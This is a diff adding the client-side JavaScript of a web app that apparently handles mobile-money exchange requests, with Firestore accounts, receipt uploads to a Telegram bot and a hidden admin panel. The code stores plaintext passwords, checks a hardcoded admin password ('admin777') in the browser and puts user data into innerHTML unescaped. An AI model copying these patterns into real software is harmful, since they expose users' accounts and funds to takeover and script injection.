+    onSnapshot(q, (snapshot) => {
+        const listDiv = document.getElementById('admin-user-list');
+        listDiv.innerHTML = "";
+        
+        if(snapshot.empty) {
+            listDiv.innerHTML = '<p style="color: #888; font-size: 12px;">No pending requests.</p>';
+            return;
+        }
+
+        snapshot.forEach((userDoc) => {
+            const userData = userDoc.data();
+            const history = userData.history || [];
+            const lastReq = history[history.length - 1] || {};
+
+            const userCard = document.createElement('div');
+            userCard.className = "admin-user-card";
+            userCard.innerHTML = `
+                <div class="admin-user-info">
+                    <b>👤 Name:</b> ${userData.name}<br>
+                    <b>📞 Phone:</b> ${userData.phone}<br>
+                    <b>💰 Type:</b> ${lastReq.amount || 'N/A'}<br>
+                    <b>📲 Receiver:</b> ${lastReq.receivePhone || 'N/A'}<br>
+                    <b>🎫 TID:</b> ${lastReq.tid || 'N/A'}
+                </div>
+                <div class="admin-btn-group">
+                    <button class="confirm-btn reject-btn" onclick="updateStatusFromList('${userData.phone}', 'rejected')">Reject ❌</button>
+                    <button class="confirm-btn approve-btn" onclick="updateStatusFromList('${userData.phone}', 'completed')">Approve ✅</button>
+                </div>
+            `;
+            listDiv.appendChild(userCard);
+        });
+    });
+}
+
+window.switchAuth = function(mode) {
+    const title = document.getElementById('auth-title');
+    const btnText = document.getElementById('btn-text');
+    const signupFields = document.getElementById('signup-fields');
+    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+    
+    if(mode === 'signup') {
+        document.getElementById('signup-tab').classList.add('active');
+        title.innerText = "Create Secure Account";
+        btnText.innerText = "Get Started";
+        signupFields.style.display = 'block';
+    } else {
+        document.getElementById('login-tab').classList.add('active');
+        title.innerText = "Welcome Back";
+        btnText.innerText = "Login Now";
+        signupFields.style.display = 'none';
+    }
+}
+
+async function sendTelegramAlert(message) {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+    });
+}
+
+window.handleAuth = async function() {
+    const phone = document.getElementById('auth-phone').value.trim();
+    const pass = document.getElementById('auth-pass').value.trim();
+    const name = document.getElementById('reg-name').value.trim();
+    const isSignUp = document.getElementById('signup-fields').style.display === 'block';
+
+    if(!phone || phone.length < 9) return alert("မှန်ကန်သော ဖုန်းနံပါတ် ဖြည့်စွက်ပါ");
+    if(!pass || pass.length < 6) return alert("စကားဝှက်သည် အနည်းဆုံး ၆ လုံး ရှိရပါမည်");
+
+    const authBtn = document.getElementById('auth-btn');
+    authBtn.disabled = true;
+    authBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing Securely...';
+
+    const userRef = doc(db, "users", phone);
+
+    try {
+        if(isSignUp) {
+            if(!name) { alert("သင့်နာမည်ကို ထည့်သွင်းပေးပါ"); authBtn.disabled = false; return; }
+            const existingUser = await getDoc(userRef);
+            if (existingUser.exists()) {
+                alert("ဤဖုန်းနံပါတ်ဖြင့် အကောင့်ရှိပြီးသားဖြစ်ပါသည်။ Login ဝင်ကြည့်ပါ။");
+                window.switchAuth('login');
+            } else {
+                await setDoc(userRef, {
+                    name, phone, pass, 
+                    small_count: 0, 
+                    medium_count: 0, 
+                    large_count: 0, 
+                    history: [], 
+                    status: 'none', 
+                    last_month: new Date().getMonth(), 
+                    createdAt: Date.now()
+                });
+                await sendTelegramAlert(`🆕 *New User Registered!*\n👤 Name: ${name}\n📞 Phone: ${phone}`);
+                alert("အကောင့်ဖွင့်ခြင်း အောင်မြင်ပါသည်။ Login ပြန်ဝင်ပေးပါ။");
+                window.switchAuth('login');
+            }
+        } else {
+            const userSnap = await getDoc(userRef);
+            if(userSnap.exists() && userSnap.data().pass === pass) {
+                currentUser = userSnap.data();
+                sessionStorage.setItem('loggedInPhone', phone);
+                await sendTelegramAlert(`🔓 *User Logged In!*\n👤 Name: ${currentUser.name}\n📞 Phone: ${phone}`);
+                showMainContent();
+            } else {
+                alert("ဖုန်းနံပါတ် သို့မဟုတ် စကားဝှက် မှားယွင်းနေပါသည်။");
+            }
+        }
+    } catch(e) { alert("ချို့ယွင်းချက် ဖြစ်ပေါ်နေပါသည်။"); }
+    authBtn.disabled = false;
+    authBtn.innerHTML = isSignUp ? 'Get Started <i class="fas fa-arrow-right"></i>' : 'Login Now <i class="fas fa-arrow-right"></i>';
+}
+
+function showMainContent() {
+    document.getElementById('auth-container').style.display = 'none';
+    document.getElementById('main-content').style.display = 'block';
+    document.getElementById('logged-user').innerHTML = '<i class="fas fa-user-circle"></i> Logged in: ' + currentUser.name;
+    
+    if(currentUser.viber) document.getElementById('contact-viber').value = currentUser.viber;
+    if(currentUser.telegram) document.getElementById('contact-telegram').value = currentUser.telegram;
+    if(currentUser.tiktok) document.getElementById('contact-tiktok').value = currentUser.tiktok;
+
+    checkExchangeLimits();
+    updateStatusUI();
+    renderHistory();
+    calculateExchange();
+}
+
+window.addEventListener('load', async () => {
+    const savedPhone = sessionStorage.getItem('loggedInPhone');
+    if (savedPhone) {
+        const userRef = doc(db, "users", savedPhone);
+        const snap = await getDoc(userRef);
+        if (snap.exists()) {
+            currentUser = snap.data();
+            showMainContent();
+        }
+    }
+});
+
+async function updateStatusUI() {
+    if (!currentUser) return;
+    const userRef = doc(db, "users", currentUser.phone);
+    onSnapshot(userRef, (snap) => {
+        const data = snap.data();
+        const status = data.status;
+        const label = document.getElementById('status-label');
+        const desc = document.getElementById('status-desc');
+        const progress = document.getElementById('status-progress');
+
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active', 'processing'));
+
+        if (status && status !== 'none') {
+            document.getElementById('step-1').classList.add('active'); 
+
+            if (status === 'completed') {
+                document.getElementById('step-2').classList.add('active');
+                document.getElementById('step-3').classList.add('active');
+                label.innerText = 'အောင်မြင်ပါသည် ✅';
+                label.style.color = '#079992';
+                desc.innerText = 'လဲလှယ်မှု အောင်မြင်စွာ ပြီးဆုံးပါပြီ။';
+                progress.style.width = '100%';
+                progress.style.background = '#079992';
+            } else if (status === 'rejected') {
+                label.innerText = 'ငြင်းပယ်ခံရသည် ❌';
+                label.style.color = 'var(--danger)';
+                desc.innerText = 'အချက်အလက် မှားယွင်းနေသဖြင့် ငြင်းပယ်လိုက်ပါသည်။';
+                progress.style.width = '100%';
+                progress.style.background = 'var(--danger)';
+            } else {
+                document.getElementById('step-2').classList.add('processing', 'active');
+                label.innerText = 'Verification Pending';
+                label.style.color = 'var(--warning)';
+                desc.innerText = 'လဲလှယ်မှုမှန်ကန်ကြောင်းစစ်ဆေးနေပါသည် (၅-၁၅ မိနစ်ခန့်ကြာနိုင်ပါသည်)';
+                progress.style.width = '45%';
+                progress.style.background = 'var(--warning)';
+            }
+        }
+        renderHistory();
+    });
+}
+
+async function renderHistory() {
+    if (!currentUser) return;
+    const userRef = doc(db, "users", currentUser.phone);
+    const snap = await getDoc(userRef);
+    const data = snap.data();
+    const historyList = document.getElementById('history-list');
+    historyList.innerHTML = "";
+
+    const history = data.history || [];
+    const thirtyDaysInMs = 30 * 24 * 60 * 60 * 1000;
+    const now = Date.now();
+    const validHistory = history.filter(item => (now - item.timestamp) < thirtyDaysInMs);
+
+    if (validHistory.length === 0) {
+        historyList.innerHTML = "<p style='text-align: center; color: #999;'>လဲလှယ်မှုမှတ်တမ်းမရှိသေးပါ။</p>";
+    } else {
+        validHistory.reverse().forEach(item => {
+            const div = document.createElement('div');
+            div.className = "history-item";
+            const dateStr = new Date(item.timestamp).toLocaleDateString('my-MM', { day: 'numeric', month: 'short', year: 'numeric' });
+            div.innerHTML = `
+                <div style="display:flex; justify-content:space-between; margin-bottom:5px;">
+                    <b>${item.amount}</b>
+                    <small style="color:#888;">${dateStr}</small>
+                </div>
+                <div style="font-size:12px;">Transaction ID: ${item.tid}</div>
+                <div class="h-status-${item.status}" style="font-size:12px; margin-top:5px;">Status: ${item.status.toUpperCase()}</div>
+            `;
+            historyList.appendChild(div);
+        });
+    }
+}
+
+async function checkExchangeLimits() {
+    const userRef = doc(db, "users", currentUser.phone);
+    const snap = await getDoc(userRef);
+    const data = snap.data();
+    const currentMonth = new Date().getMonth();
+
+    if(data.last_month !== currentMonth) {
+        await updateDoc(userRef, { small_count: 0, medium_count: 0, large_count: 0, last_month: currentMonth });
+    }
+
+    if(data.small_count >= 2) {
+        document.querySelectorAll('#group-small option').forEach(opt => opt.disabled = true);
+    }
+    if(data.medium_count >= 1) {
+        document.querySelectorAll('#group-medium option').forEach(opt => opt.disabled = true);
+    }
+    if(data.large_count >= 1) {
+        document.querySelectorAll('#group-large option').forEach(opt => opt.disabled = true);
+    }
+}
+
+window.previewImage = function(input) {
+    if (input.files && input.files[0]) {
+        selectedFile = input.files[0];
+        const reader = new FileReader();
+        reader.onload = (e) => {
+            document.getElementById('receipt-preview').src = e.target.result;
+            document.getElementById('receipt-preview').style.display = 'block';
+            document.getElementById('file-status').innerText = "ပြေစာ ရွေးချယ်ပြီးပါပြီ ✅";
+        }
+        reader.readAsDataURL(input.files[0]);
+    }
+}
+
+window.toggleInfo = function() { document.getElementById('p2p-info').classList.toggle('active'); }
+window.openHistory = function() { document.getElementById('history-modal').style.display = 'block'; renderHistory(); }
+window.closeHistory = function() { document.getElementById('history-modal').style.display = 'none'; }
+
+window.selectMethod = function(m) {
+    selectedPayment = m;
+    document.querySelectorAll('.method').forEach(el => el.classList.remove('active'));
+    document.getElementById('m-'+m).classList.add('active');
+    document.getElementById('kpay-info').style.display = m === 'kpay' ? 'block' : 'none';
+    document.getElementById('wave-info').style.display = m === 'wave' ? 'block' : 'none';
+}
+
+window.sendContactData = async function() {
+    const tg = document.getElementById('contact-telegram').value;
+    const vb = document.getElementById('contact-viber').value;
+    const tk = document.getElementById('contact-tiktok').value;
+
+    if(!tg && !vb) return alert("အနည်းဆုံး ဆက်သွယ်ရန် တစ်ခု ဖြည့်သွင်းပေးပါ");
+
+    try {
+        await updateDoc(doc(db, "users", currentUser.phone), {
+            telegram: tg, viber: vb, tiktok: tk
+        });
+        await sendTelegramAlert(`👤 *User Contact Updated!*\n📞 Account: ${currentUser.phone}\n👤 Name: ${currentUser.name}\n✈️ Telegram: ${tg}\n📞 Viber: ${vb}\n🎵 TikTok: ${tk}`);
+        alert("အချက်အလက်များ သိမ်းဆည်းပြီးပါပြီ။ ✅");
+    } catch(e) { alert("Error saving contacts!"); }
+}
+
+window.sendToTelegram = async function() {
+    const amount = document.getElementById('amount-select').value;
+    const receivePhone = document.getElementById('user-phone-receive').value;
+    const userName = document.getElementById('user-name').value;
+    const tid = document.getElementById('tran-id').value;
+    
+    if(!selectedFile || !tid || !receivePhone) return alert("အချက်အလက်ပြည့်စုံအောင်ဖြည့်ပါ");
+
+    const userRef = doc(db, "users", currentUser.phone);
+    const btn = document.getElementById('submit-btn');
+    btn.disabled = true;
+    btn.innerHTML = '<i class="fas fa-sync fa-spin"></i> Securing Transaction...';
+
+    const exchangeRecord = {
+        amount: amount,
+        tid: tid,
+        receivePhone: receivePhone,
+        timestamp: Date.now(),
+        status: 'pending'
+    };
+
+    const userSnap = await getDoc(userRef);
+    const uData = userSnap.data();
+
+    const optGroup = document.getElementById('amount-select').options[document.getElementById('amount-select').selectedIndex].parentElement.id;
+    if((optGroup === "group-small" && uData.small_count >= 2) || 
+       (optGroup === "group-medium" && uData.medium_count >= 1) || 
+       (optGroup === "group-large" && uData.large_count >= 1)) {
+        alert("ဤလအတွက် လဲလှယ်မှု အကြိမ်ရေ ပြည့်သွားပါပြီ။");
+        location.reload();
+        return;
+    }
+
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', selectedFile);
+    formData.append('caption', `🔔 *NEW EXCHANGE REQUEST*\n\n💰 Type: ${amount}\n👤 Pay Name: ${userName}\n📞 Acc Phone: ${currentUser.phone}\n📲 Receiver: ${receivePhone}\n🎫 TID: ${tid}\n\n📅 Date: ${new Date().toLocaleString()}`);
+
+    try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+        if(res.ok) {
+            let updatePayload = { 
+                status: 'pending',
+                history: arrayUnion(exchangeRecord)
+            };
+            
+            if(optGroup === "group-small") updatePayload.small_count = (uData.small_count || 0) + 1;
+            if(optGroup === "group-medium") updatePayload.medium_count = (uData.medium_count || 0) + 1;
+            if(optGroup === "group-large") updatePayload.large_count = (uData.large_count || 0) + 1;
+
+            await updateDoc(userRef, updatePayload);
+            alert("လဲလှယ်မှု တောင်းဆိုချက် ပေးပို့ပြီးပါပြီ။ အချိန် ၁၅ မိနစ်ခန့် စောင့်ဆိုင်းပေးပါ။");
+            location.reload();
+        }
+    } catch(e) { alert("Error!"); btn.disabled = false; }
+}
+
+window.logout = () => { sessionStorage.removeItem('loggedInPhone'); location.reload(); }
+window.copyText = (id) => { navigator.clipboard.writeText(document.getElementById(id).innerText); alert("Copied to Clipboard!"); }
+
+// --- Admin Section Logic ---
+let clickCount = 0;
+window.adminClick = () => { clickCount++; if(clickCount>=5) { document.getElementById('admin-panel').style.display='block'; listenToPendingRequests(); } }
+
+window.updateStatusFromList = async (userPhone, newStatus) => {
+    const pass = document.getElementById('admin-pass').value;
+    if(pass !== "admin777") return alert("Wrong Admin Password! Please enter correct password above.");
+
+    try {
+        const userRef = doc(db, "users", userPhone);
+        const snap = await getDoc(userRef);
+        if(!snap.exists()) return alert("User not found!");
+        
+        const data = snap.data();
+        const history = data.history || [];
+        if(history.length > 0) {
+            history[history.length - 1].status = newStatus;
+        }
+
+        await updateDoc(userRef, { 
+            status: newStatus, 
+            history: history 
+        });
+        
+        alert(`Request for ${userPhone} updated to ${newStatus}`);
+    } catch(e) { 
+        console.error(e);
+        alert("Action Failed!"); 
+    }
+}
+
+window.saveSettings = async function() {
+    const pass = document.getElementById('admin-pass').value;
+    if(pass === "admin777") {
+        const kn = document.getElementById('new-kpay-name-input').value;
+        const kp = document.getElementById('new-kpay-num-input').value;
+        const wn = document.getElementById('new-wave-name-input').value;
+        const wp = document.getElementById('new-wave-num-input').value;
+        await setDoc(doc(db, "settings", "payment_info"), {
+            kpayName: kn || document.getElementById('kpay-name').innerText,
+            kpayNum: kp || document.getElementById('kpay-num').innerText,
+            waveName: wn || document.getElementById('wave-name').innerText,
+            waveNum: wp || document.getElementById('wave-num').innerText
+        });
+        alert("Payment Data Updated!");
+    } else { alert("Wrong Admin Password"); }
+}
+</script>
+</body>
+</html>
